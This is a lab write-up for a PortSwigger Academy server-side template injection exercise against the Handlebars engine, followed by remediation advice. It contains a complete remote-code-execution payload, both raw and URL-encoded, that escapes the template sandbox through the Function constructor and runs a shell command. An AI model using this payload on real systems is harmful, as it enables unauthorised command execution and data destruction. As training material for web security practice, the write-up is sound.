# Lab 4: Server-Side Template Injection in an Unknown Language with a Documented Exploit

**Category:** Server-Side Template Injection (SSTI)
**Difficulty:** Practitioner
**Lab link:** [SSTI in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

## Overview

The search parameter reflects user input through an unknown template engine. The workflow is: probe to detect evaluation → fingerprint the engine → find a known RCE exploit in public research → adapt and fire it. The engine is Handlebars (Node.js), which has a well-documented `child_process.execSync` exploit using `with` blocks and the `Function` constructor.

**Engine:** Handlebars (Node.js)

## Key Concepts

- **Unknown engine workflow:** when you don't know the engine, test a polyglot set of probes — `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` — and infer the engine from which evaluates AND from error messages (Handlebars errors include "Handlebars" in the stack trace).
- **Distinguishing Handlebars from Jinja2:** `{{7*'7'}}` → Jinja2 returns `7777777` (string repetition); Handlebars returns `49` (numeric coercion) or an error.
- **Handlebars sandbox bypass:** Handlebars doesn't expose `require` or `process` directly, but `string.sub` is `String.prototype.sub`, which is a `Function`. Via `lookup` and `apply`, you can smuggle a `Function` constructor call that evaluates arbitrary JS, giving access to `require('child_process')`.

## Solution

### Step 1 — Detect SSTI

Inject into the `search` parameter:
```
?search={{7*7}}
```
If `49` is reflected → Handlebars (or similar) confirmed.

### Step 2 — Fingerprint

```
?search={{7*'7'}}
```
- Returns `49` or error → Handlebars
- Returns `7777777` → Jinja2

Handlebars errors also display `Handlebars` in the stack trace on verbose error pages.

### Step 3 — RCE payload

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

URL-encode the entire payload and pass it as the `search` parameter. Lab solved on page load.

## How the Exploit Works

1. `string.sub` is `String.prototype.sub` — a native JS function (a `Function` instance).
2. `lookup string.sub "constructor"` retrieves `Function.prototype.constructor` → the `Function` constructor itself.
3. `this.push (lookup string.sub "constructor")` stores `Function` in a list.
4. `this.push "return require('child_process').execSync('...');"` stores the code string.
5. `string.sub.apply 0 codelist` calls `Function.apply(0, ["return require..."])` → `new Function("return require...")` → executes the code.
6. `require('child_process').execSync(...)` runs the shell command.

## URL-Encoded Payload

```
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.execSync%28%27rm%20%2Fhome%2Fcarlos%2Fmorale.txt%27%29%3B%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D
```

## Remediation

- Use Handlebars in strict mode and disable prototype property access (`allowProtoPropertiesByDefault: false`).
- Never pass raw user input as a template string — only as template context data.
- Handlebars v4.7.7+ adds additional prototype access restrictions by default.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/server-side-template-injection/lab-04-handlebars-unknown-language/solve.py)

Sends the URL-encoded Handlebars RCE payload via the search parameter.

## Key Takeaways

- When the engine is unknown, error messages and polyglot probe responses reveal it.
- Handlebars blocks direct `require` access but `string.sub` → `Function` constructor is an established bypass.
- Look for public exploit write-ups once you identify the engine — most common engines have documented RCE chains.
